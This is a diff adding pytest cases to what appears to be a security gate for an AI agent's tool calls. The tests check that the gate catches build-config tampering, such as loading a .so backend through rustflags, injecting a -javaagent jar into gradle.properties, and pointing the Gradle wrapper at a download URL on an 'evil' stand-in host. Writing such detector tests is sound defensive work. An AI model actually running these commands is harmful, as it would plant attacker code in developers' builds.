@@ -504,3 +504,21 @@ def test_qa3_rustflags_codegen_backend_gated():
     for c in ('[build]\nrustflags = ["-Zcodegen-backend=/tmp/x.so"]\n',
               '[build]\nrustflags = ["-Z", "llvm-plugins=/tmp/p.so"]\n'):
         assert _hit(evaluate(_write(".cargo/config.toml", c), EMPTY))
+
+
+# ---- QA round 4 re-review: shell `!` negation, edit-fragment comments ---------
+
+@pytest.mark.parametrize("cmd", [
+    "! true; echo 'org.gradle.jvmargs=-javaagent:/x.jar' >> gradle.properties",
+    "!(false) || echo 'org.gradle.java.home=/tmp/j' >> ~/.gradle/gradle.properties",
+    "  ! grep -q x f && echo 'distributionUrl=https://evil/x.zip' > gradle/wrapper/gradle-wrapper.properties",
+])
+def test_qa4b_shell_bang_negation_gated(cmd):
+    assert _hit(evaluate(_shell(cmd), EMPTY))
+
+
+def test_qa4b_edit_fragment_comment_lead_gated():
+    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="Edit", args={
+        "file_path": "/nonexistent/gradle.properties",
+        "old_string": "x", "new_string": "# -javaagent:/x.jar"})
+    assert _hit(evaluate(ev, EMPTY))
